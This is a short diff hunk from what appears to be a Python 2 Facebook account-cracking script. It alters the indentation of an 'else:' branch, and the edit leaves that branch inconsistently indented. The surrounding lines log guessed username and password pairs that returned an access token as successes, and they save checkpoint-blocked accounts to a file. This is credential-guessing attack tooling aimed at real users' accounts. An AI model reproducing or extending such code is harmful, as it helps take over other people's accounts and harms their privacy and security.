@@ -480,7 +480,7 @@ def pilih_super():
 															        if 'access_token' in q:
 																        print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass8 + ' 👽 ' + b['name']
 																        oks.append(user+pass8)
-																    else:
+																          else:
 																	    if 'www.facebook.com' in q["error_msg"]:
 																	        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass8 + ' 👽 ' + b['name']
 																	        cek = open("out/CP.txt", "a")
